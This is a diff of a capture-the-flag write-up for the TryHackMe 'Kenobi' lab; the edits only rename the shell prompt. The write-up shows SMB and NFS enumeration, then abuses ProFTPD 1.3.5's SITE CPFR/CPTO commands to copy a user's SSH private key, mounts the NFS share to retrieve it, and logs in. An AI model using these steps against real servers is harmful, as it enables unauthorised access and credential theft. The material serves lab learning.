@@ -7,7 +7,7 @@
 # enumerate
 ## nmap
 ```console
-kali@kali:~/THM$ sudo python3 ../pymap.py -t 10.10.120.243
+bibo318@parrot:~/THM$ sudo python3 ../pymap.py -t 10.10.120.243
 [sudo] password for kali: 
 created by gu2rks/kurohat 
 find me here https://github.com/gu2rks
@@ -102,7 +102,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.05 seconds
 
 ## enumerating SAMBA
 ```console
-kali@kali:~/THM$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.120.243
+bibo318@parrot:~/THM$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.120.243
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 07:21 EDT
 Nmap scan report for 10.10.120.243
 Host is up (0.044s latency).
@@ -145,7 +145,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
 ## rpcbind port 111
 service rpcbind is an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
 ```console
-kali@kali:~/THM/kenobi$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.120.243
+bibo318@parrot:~/THM/kenobi$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.120.243
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 07:40 EDT
 Nmap scan report for 10.10.120.243
 Host is up (0.047s latency).
@@ -161,7 +161,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
 # Foothold
 from the first scan: we notice that ProFTPD 1.3.5 were use to run FTP. let search for exploit.
 ```console
-kali@kali:~/THM/kenobi$ searchsploit ProFTPD 1.3.5
+bibo318@parrot:~/THM/kenobi$ searchsploit ProFTPD 1.3.5
 ----------------------------------------------------------------- ---------------------------------
  Exploit Title                                                   |  Path
 ----------------------------------------------------------------- ---------------------------------
@@ -182,7 +182,7 @@ We know from the `log.txt` that FTP is run by Kenobi which mean we will get Keno
 
 now let copy it Kenobi ssh key using ```SITE CPFR``` and ```SITE CPTO`` via netcat and put it in `/var`:
 ```console
-kali@kali:~/THM/kenobi$ nc 10.10.120.243 21
+bibo318@parrot:~/THM/kenobi$ nc 10.10.120.243 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.120.243]
 SITE CPFR /home/kenobi/.ssh/id_rsa
 350 File or directory exists, ready for destination name
@@ -191,21 +191,21 @@ SITE CPTO /var/tmp/id_rsa
 ```
 let mount `/var/tmp` to our Kali and get the fcing key!
 ```console
-kali@kali:~/THM/kenobi$ mkdir NFS
-kali@kali:~/THM/kenobi$ sudo mount 10.10.120.243:/var NFS #mount
-kali@kali:~/THM/kenobi$ ls NFS/tmp/
+bibo318@parrot:~/THM/kenobi$ mkdir NFS
+bibo318@parrot:~/THM/kenobi$ sudo mount 10.10.120.243:/var NFS #mount
+bibo318@parrot:~/THM/kenobi$ ls NFS/tmp/
 id_rsa
 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM/
 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw/
 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn/
 systemd-private-ef8cb470bb2f4219b0e5c411e18962d4-systemd-timesyncd.service-yFRo9P/                                                             
-kali@kali:~/THM/kenobi$ cp NFS/tmp/id_rsa kenobi-key #copy key
-kali@kali:~/THM/kenobi$ umount NFS # unmout
+bibo318@parrot:~/THM/kenobi$ cp NFS/tmp/id_rsa kenobi-key #copy key
+bibo318@parrot:~/THM/kenobi$ umount NFS # unmout
 ```
 let SSH to the machine using the key
 ```console
-kali@kali:~/THM/kenobi$ chmod 600 kenobi-key 
-kali@kali:~/THM/kenobi$ ssh -i kenobi-key kenobi@10.10.120.243
+bibo318@parrot:~/THM/kenobi$ chmod 600 kenobi-key 
+bibo318@parrot:~/THM/kenobi$ ssh -i kenobi-key kenobi@10.10.120.243
 kenobi@kenobi:~$ 
 ```
 WE ARE IN
